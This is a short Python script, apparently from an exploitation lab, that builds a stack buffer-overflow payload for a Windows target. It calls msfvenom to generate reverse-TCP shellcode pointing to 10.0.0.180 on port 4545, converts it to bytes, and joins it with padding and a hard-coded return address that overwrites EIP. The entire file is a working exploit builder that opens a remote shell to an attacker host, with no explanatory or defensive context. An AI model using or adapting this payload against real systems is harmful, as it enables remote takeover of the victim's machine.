import os


def execute_command(_sys_command):
    print(f'[+] Command Used:\n[+] # user@pwn> {_sys_command}\n')
    var_return = os.popen(_sys_command).read()
    return var_return


def build_final_payload():
    global ip, port
    sys_command = f'msfvenom --payload windows/shell_reverse_tcp LHOST=10.0.0.180 LPORT=4545 ' \
                  f'EXITFUNC=thread -f c -a x86 --platform windows -b "\\x00\\x0a\\x0d\\xff" -n 20'

    shellcode = execute_command(sys_command)
    shellcode = ((''.join(shellcode.split('\n')[1:-1])).replace(';', '')).replace('"', '')
    shellcode = bytes.fromhex(shellcode.replace('\\x', ''))

    _a_buff = 'A' * 20
    _c_buff = 'C' * 20
    eip_le = bytes.fromhex('fb41bd7c')

    a_buff_hex, b_buff_hex, c_buff_hex = '', '', ''
    for a in _a_buff:
        a_buff_hex += hex(ord(a)).replace('0x','')
    for c in _c_buff:
        c_buff_hex += hex(ord(c)).replace('0x','')
    a_buff_hex = bytes.fromhex(a_buff_hex)
    c_buff_hex = bytes.fromhex(c_buff_hex)

    f_payload = a_buff_hex + eip_le + shellcode + c_buff_hex
    #f_payload = bytearray.fromhex(f_payload).decode('iso-8859-1')
    print(eip_le, '\n')
    print(f_payload)


if __name__ == "__main__":
    build_final_payload()
